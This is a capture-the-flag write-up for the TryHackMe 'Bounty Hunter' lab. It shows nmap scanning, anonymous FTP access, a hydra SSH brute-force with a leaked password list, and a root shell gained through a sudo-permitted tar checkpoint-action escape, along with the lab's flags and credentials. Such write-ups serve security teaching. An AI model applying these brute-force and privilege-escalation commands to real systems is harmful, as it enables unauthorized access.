---
title: 'TryHackMe: Bounty Hunter'
created: '2020-09-09T21:22:42.037Z'
modified: '2020-09-09T22:10:02.482Z'
---

# TryHackMe: Bounty Hunter

## Task 1 ###

### 1. Deploy ### 
`-`
### 2. Find all open ports on machine ###
`nmap -A -p- target.thm -v` 
 ```
Scanning target.thm (10.10.237.73) [65535 ports]
    Discovered open port 22/tcp on 10.10.237.73
    Discovered open port 21/tcp on 10.10.237.73
    Discovered open port 80/tcp on 10.10.237.73
```
Ports are:
- `22, SSH`
- `21, FTP`
- `80, HTTP`

### 3. Who wrote the task list? ###

Navigate to host `10.10.237.73`.

- Blurb about 4 characters:
    - `Spike`
    - `Jet`
    - `Ed`
    - `Faye`

#### Test FTP for anon access ####
`ftp 10.10.237.73`, use username `Anonymous`, with a blank password.
##### Login works #####
```
kali@kali:~/Desktop/TryHackMe/cowboyhacker$ ftp 10.10.237.73
Connected to 10.10.237.73.
220 (vsFTPd 3.0.3)
Name (10.10.237.73:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

##### Check files in dir, and download them #####
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.06 secs (6.6875 kB/s)
ftp> get task.txt 
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.06 secs (1.1806 kB/s)

```
##### Read stolen files #####
`locks.txt` (seems like a list of passwords...)
```
kali@kali:~/Desktop/TryHackMe/cowboyhacker$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
`cat task.txt` (the task list for the _flag_)
```
kali@kali:~/Desktop/TryHackMe/cowboyhacker$ cat task.txt  
1.) Protect Vicious.  
2.) Plan for Red Eye pickup on the moon.    
-lin                
```
### 4. What service can you bruteforce with the text file found? ###

There were only 3 ports open on the scan, of which they're used for the either FTP, SSH, HTTP. We could brute FTP, but we'd have less capability; HTTP, not really brutable with what we've uncovered so far; so SSH, seems like the best option.

### 5. What is the users password?

Lets assume: 
Username: `lin`
Password file: `locks.txt`

And bruteforce with `hydra -l lin -P ~/Desktop/TryHackMe/cowboyhacker/locks.txt ssh://target.thm`

```
kali@kali:~/Desktop/TryHackMe/cowboyhacker$ hydra -l lin -P ~/Desktop/TryHackMe/cowboyhacker/locks.txt ssh://target.thm
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                           
                                                                                                                                                                                                                                          
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-09 17:51:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://target.thm:22/
[22][ssh] host: target.thm   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-09 17:51:35

```

Revealing the password is `RedDr4gonSynd1cat3`.

### 6. user.txt

Lets `ssh` into the box with our cracked credentials `lin:RedDr4gonSynd1cat3`.

`ssh lin@target.thm`

```
kali@kali:~/Desktop/TryHackMe/cowboyhacker$ ssh lin@10.10.237.73
The authenticity of host '10.10.237.73 (10.10.237.73)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.237.73' (ECDSA) to the list of known hosts.
lin@10.10.237.73's password: 
Permission denied, please try again.
lin@10.10.237.73's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 

```

Then we need to find and return `user.txt`.

```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

### 7. root.txt
Lets assume the `root.txt` is in the `/root` directory and `ls` it to see if we can see anything there.

```
lin@bountyhacker:~/Desktop$ ls /root
ls: cannot open directory '/root': Permission denied
```

We don't have permission, so need to find a privesc. Lets start with using `sudo -l` to identify any root priviledged binaries we may have assigned.

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Output shows that we can exploit `/bin/tar` as `root`. On reading the `/bin/tar` manual with `/bin/tar --help`. We can see that we can exploit `--checkpoint[=NUMBER]` and `--checkpoint-action=[ACTION]`. Causing `tar` to fire an action on every checkpoint.

Lets 'create' a tar compressed archive. We'll use `/dev/null` for input and output incase of lacking permissions..

`sudo tar -c /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root

```

Successfully achieved a root shell. Lets try find that last flag.

```
# ls /root
root.txt
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```





